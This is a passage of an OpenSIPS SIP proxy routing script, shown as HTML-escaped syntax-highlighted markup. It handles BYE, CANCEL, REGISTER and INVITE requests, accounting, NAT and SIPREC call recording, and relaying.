&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;BYE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# do accounting even if the transaction fails&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			do_accounting&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failed&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# route it out to whatever destination was set by loose_route()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# in $du (destination URI).&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;relay&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# CANCEL processing&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CANCEL&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;t_check_trans&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			t_relay&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	t_check_trans&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; !&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_myself&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$fd&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# if caller is not local, then called number must be local&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_myself&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$rd&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;403&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Rely forbidden&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# preloaded route checking&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;loose_route&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;L_ERR&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Attempt to route with preloaded Route&amp;#39;s [&lt;/span&gt;$fu&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$tu&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$ru&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;$ci&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ACK&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;403&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Preload Route denied&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# record routing&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER|MESSAGE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		record_route&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# account only INVITEs&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;INVITE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		create_dialog&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		rtpproxy_engage&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		siprec_start_recording&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sip:127.0.0.1:5090&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		do_accounting&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_myself&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$rd&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		append_hf&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;P-hint: outbound\r\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;relay&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# requests for my domain&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PUBLISH|SUBSCRIBE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;503&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Service Unavailable&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!save&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			sl_reply_error&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$rU&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;NULL&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# request with no Username in RURI&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;484&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Address Incomplete&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# do lookup with method filtering&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!lookup&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;404&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Not Found&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# when routing via usrloc, log the missed calls also&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	do_accounting&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;missed&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;relay&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;relay&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# for INVITEs enable some additional helper routes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;INVITE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_on_branch&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;per_branch_ops&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_on_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;handle_nat&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_on_failure&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;missed_call&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!t_relay&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;500&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Internal Error&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;branch_route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;per_branch_ops&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
